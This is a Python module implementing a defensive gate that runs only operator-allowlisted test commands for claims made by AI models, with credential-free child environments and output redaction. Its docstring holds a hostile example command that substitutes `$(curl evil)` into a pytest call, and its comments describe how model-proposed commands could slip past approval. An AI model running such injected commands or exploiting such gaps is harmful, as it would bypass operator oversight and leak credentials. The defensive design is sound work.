"""
approved_test_gate.py
=====================
Runs the commands a code_behavior claim asserts will pass.

THIS SHIPS INERT, AND THAT IS THE DESIGN. The allowlist is empty until the
operator writes one. A test runner nobody chose is either useless or
dangerous, and there is no honest default: the set of commands safe to run on
a given machine is knowledge only its owner has.

MODEL OUTPUT IS NEVER EXECUTED. Not paraphrased, not sanitised, not "checked
first". A command runs only if its exact string is in the operator's
allowlist file. A seat proposing `pytest tests/test_x.py` does not cause that
command to run -- it causes the claim to escalate with a note that the
operator may add it to the allowlist, which is a decision made in a text
editor while awake, not by a model at 3am.

That is stricter than an allowlist of executables. `pytest` with an
operator-approved argument list is a test; `pytest --pdb` under a seat's
control is an interactive shell, and `pytest -p no:cacheprovider --co -q
$(curl evil)` is worse. Approving whole executables approves their argument
space, which nobody can enumerate.

NO SHELL. subprocess with a list argv, shell=False, so no expansion,
substitution, globbing, or chaining exists to be exploited.
"""
from __future__ import annotations

import contextlib
import json
import os
import re
import shlex
import signal

# Reason kept OFF the nosec line: bandit parses everything after "nosec" as
# test ids and warns about each prose word. subprocess is used with an argv
# list, shell=False, and only for commands the operator has approved by exact
# string in approved-commands.json.
import subprocess  # nosec B404

from adjudication_orchestrator import Claim, ClaimKind, GateResult, GateStatus

SAFE_ENV_NAMES = frozenset({
    "PATH", "LANG", "LC_ALL", "LC_CTYPE", "TZ", "TERM", "TMPDIR",
    "SYSTEMROOT", "COMSPEC", "PATHEXT",
})
"""Environment variables an approved command may see.

An ALLOWLIST because a denylist is wrong here by construction: it can only
remove the credentials someone remembered, and the one that leaks is always
the one added later. Nothing named *_API_KEY, *_TOKEN, *_SECRET or read from
.env appears here, and nothing needs to -- a test asserting code behaviour has
no business holding a vendor credential.
"""

_SECRET_HINT = re.compile(
    r"(sk-|pk-|api[-_]?key|bearer\s|token|secret|password|xox[baprs]-|"
    r"gh[pousr]_|AIza|AKIA)", re.IGNORECASE)
_LONG_OPAQUE = re.compile(r"\b[A-Za-z0-9_\-]{24,}\b")


def redact(text: str) -> str:
    """Blank anything credential-shaped before it reaches an artifact.

    DEFENCE IN DEPTH, not the primary control -- the environment allowlist is.
    This exists because the command's output goes three places that are all
    hard to recall: the on-disk check record, the operator's terminal, and the
    closer prompt, which leaves the machine. A leak into the last of those is
    unrecoverable, so the cost of over-redacting a diagnostic line is not
    comparable to the cost of missing one.
    """
    if not text:
        return text
    if _SECRET_HINT.search(text):
        return "[redacted: output matched a credential pattern]"
    return _LONG_OPAQUE.sub("[redacted]", text)


DEFAULT_ALLOWLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "approved-commands.json")


class AllowlistError(ValueError):
    """The approved-commands policy file is not a policy this code will honour.

    Raised rather than returning an empty list, because an operator who wrote a
    malformed allowlist believes commands are approved. Silently approving
    nothing would look identical to the gate being inert by choice, and they
    would never learn the file was ignored.
    """


def load_allowlist(path: str = DEFAULT_ALLOWLIST) -> list[str]:
    """Exact command strings the operator has approved. Absent file -> none.

    THE FAILURE THIS VALIDATION EXISTS TO STOP. The previous version did
    `[c for c in (cmds or []) if isinstance(c, str) and c.strip()]`. A JSON
    STRING is iterable, and every character of it is a non-empty str, so

        {"approved": "safe_cmd"}

    produced the approvals ['s', 'a', 'f', 'e', '_', 'c', 'm', 'd'] -- eight
    one-character commands the operator never approved -- while "safe_cmd",
    the command they DID intend, was not approved at all. If any executable
    named `s` exists on PATH, a model proposing the warrant `s` gets it run.
    That is a direct path from model output to subprocess with no operator
    approval anywhere in it, and it is reachable from a plausible typo.

    Everything here fails CLOSED and LOUDLY: an unreadable or malformed policy
    raises. The one silent case is a file that does not exist, which is the
    documented inert default rather than a malformed policy.
    """
    if not os.path.exists(path):
        return []
    try:
        with open(path, encoding="utf-8") as fh:
            raw = json.load(fh)
    except json.JSONDecodeError as exc:
        raise AllowlistError(
            f"{path} is not valid JSON ({exc}). Refusing to run anything: a "
            f"policy file that cannot be read is not a policy that approves "
            f"nothing, it is a policy nobody knows."
        ) from None
    except OSError as exc:
        raise AllowlistError(f"{path} could not be read: {exc}") from None

    cmds = raw.get("approved") if isinstance(raw, dict) else raw
    if cmds is None:
        return []
    # A str is a sequence of str, which is exactly why this must be checked
    # before iterating and not by filtering afterwards.
    if not isinstance(cmds, list):
        raise AllowlistError(
            f"{path}: 'approved' must be a JSON LIST of command strings, got "
            f"{type(cmds).__name__}. Written as a bare string it would be "
            f"iterated one character at a time, approving every letter as a "
            f"separate command and approving the intended command not at all."
        )
    bad = [c for c in cmds if not isinstance(c, str) or not c.strip()]
    if bad:
        raise AllowlistError(
            f"{path}: every entry in 'approved' must be a non-empty string. "
            f"Rejected: {bad!r}. Dropping them silently would leave the "
            f"operator believing a command is approved when it is not."
        )
    return [c.strip() for c in cmds]


class ApprovedCommandRunner:
    """Runs an exact approved command and reports whether it exited zero."""

    def __init__(self, allowlist_path: str = DEFAULT_ALLOWLIST,
                 cwd: str | None = None, timeout_s: float = 120.0):
        self.allowlist = load_allowlist(allowlist_path)
        self.cwd = cwd or os.path.dirname(os.path.abspath(__file__))
        self.timeout_s = timeout_s

    def __call__(self, command: str) -> bool:
        ok, _ = self.run(command)
        return ok

    def run(self, command: str) -> tuple[bool, str]:
        cmd = (command or "").strip()
        if cmd not in self.allowlist:
            # Not an error and not a failure -- an unapproved command simply
            # does not run. Returning False here would let an unapproved
            # command eliminate a candidate, which is a model deciding what
            # gets tested.
            raise PermissionError(
                f"not in the approved list: {cmd!r}. Add it to "
                f"approved-commands.json yourself if you want it run."
            )
        argv = shlex.split(cmd)
        if not argv:
            raise PermissionError(f"approved entry {cmd!r} has no executable")

        # Popen, not run(): the timeout cleanup needs the PID.
        #
        # subprocess.run raises TimeoutExpired, which carries the COMMAND but
        # not the process, so the kill below looked up a pid that was never
        # there and did nothing. A timed-out command's descendants survived
        # and kept working after the gate had already reported BLOCKED.
        try:
            proc = subprocess.Popen(  # nosec B603
                argv, cwd=self.cwd,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, shell=False,
                # THE CHILD MUST NOT INHERIT THE PANEL'S CREDENTIALS.
                #
                # This is the whole point. An approved command is approved to
                # run -- it is not approved to read five vendor API keys. With
                # an inherited environment, any conftest, plugin, or module the
                # command legitimately loads can read SEAT_n_API_KEY. Verified
                # end to end: the key reached GateResult.detail, was written to
                # check.md on disk, and was placed in the closer prompt, which
                # is transmitted to a third-party vendor. The operator approved
                # a test command and thereby mailed their credentials out.
                env=self._child_env(),
                # A dedicated process group, so the timeout below can kill the
                # whole tree. Killing only the direct child leaves grandchildren
                # running after the gate has reported.
                start_new_session=True,
                stdin=subprocess.DEVNULL,
            )
        except OSError as exc:
            raise PermissionError(f"could not start {cmd!r}: {exc}") from None

        try:
            out, err = proc.communicate(timeout=self.timeout_s)
        except subprocess.TimeoutExpired:
            self._kill_tree(proc)
            proc.communicate()
            raise TimeoutError(f"{cmd!r} exceeded {self.timeout_s}s") from None

        # BOTH STREAMS. The detail took stdout when it was non-empty and only
        # then fell back to stderr, so a command that printed a startup banner
        # and then failed recorded the banner -- the operator saw the greeting
        # and never the error.
        lines = [ln for ln in ((err or "") + "\n" + (out or "")).splitlines()
                 if ln.strip()]
        detail = lines[0][:200] if lines else f"exit {proc.returncode}"
        return proc.returncode == 0, redact(detail)

    # -- isolation ---------------------------------------------------------
    def _child_env(self) -> dict[str, str]:
        """A minimal environment with no credential in it.

        An ALLOWLIST, not a denylist. Removing the variables we happen to know
        about would let the next credential added to .env flow straight through
        -- and the point of failure is a variable nobody remembered.
        """
        env = {k: v for k, v in os.environ.items() if k in SAFE_ENV_NAMES}
        env.setdefault("PATH", os.defpath)
        env["HOME"] = self.cwd
        # Marks the child for anything that wants to refuse to run under it.
        env["ADJUDICATION_SANDBOXED"] = "1"
        return env

    @staticmethod
    def _kill_tree(proc: subprocess.Popen[str]) -> None:
        """Terminate the timed-out command and everything it started.

        subprocess kills only the process it launched. A test runner that
        spawned workers leaves them running, still holding whatever the parent
        had, doing work the gate has already stopped waiting for.
        """
        with contextlib.suppress(OSError, ProcessLookupError):
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        with contextlib.suppress(OSError, ProcessLookupError):
            proc.kill()


class ApprovedTestGate:
    """code_behavior gate over operator-approved commands only.

    Unapproved commands are INAPPLICABLE, so they escalate rather than
    failing: the operator has not decided about them yet, and "nobody has
    approved this" is not evidence about the claim.
    """

    name = "test_execution"

    def __init__(self, runner: ApprovedCommandRunner | None = None):
        self.runner = runner or ApprovedCommandRunner()

    def applies_to(self, claim: Claim) -> bool:
        return (claim.kind is ClaimKind.CODE_BEHAVIOR
                and bool(claim.warrant)
                and (claim.warrant or "").strip() in self.runner.allowlist)

    def check(self, claim: Claim) -> GateResult:
        cmd = (claim.warrant or "").strip()
        try:
            ok, detail = self.runner.run(cmd)
        except PermissionError as exc:
            return GateResult(self.name, GateStatus.INAPPLICABLE, str(exc))
        except TimeoutError as exc:
            # A timeout says the check did not finish, not that the claim is
            # false. A slow machine must not refute a true assertion.
            return GateResult(self.name, GateStatus.BLOCKED, str(exc))
        except Exception as exc:  # noqa: BLE001 - could not run is not a finding
            return GateResult(self.name, GateStatus.BLOCKED,
                              f"{type(exc).__name__}: {exc}")
        return GateResult(
            self.name, GateStatus.PASS if ok else GateStatus.FAIL,
            f"`{cmd}` {'passed' if ok else 'failed'} -- {detail}",
        )


def write_example_allowlist(path: str = DEFAULT_ALLOWLIST) -> str:
    """Write an empty allowlist with instructions. Never overwrites."""
    if os.path.exists(path):
        return path
    payload = {
        "_README": [
            "Exact command strings you approve for code_behavior claims.",
            "A command runs ONLY if a seat's warrant matches an entry here",
            "character for character. Nothing here by default, so the gate is",
            "inert until you decide otherwise.",
            "",
            "Approve arguments, not executables. 'pytest' as a blanket",
            "approval also approves 'pytest --pdb', which is an interactive",
            "shell.",
            "",
            "Example:",
            '  \"approved\": [\"pytest tests/test_activation.py -q\"]',
        ],
        "approved": [],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2)
    return path
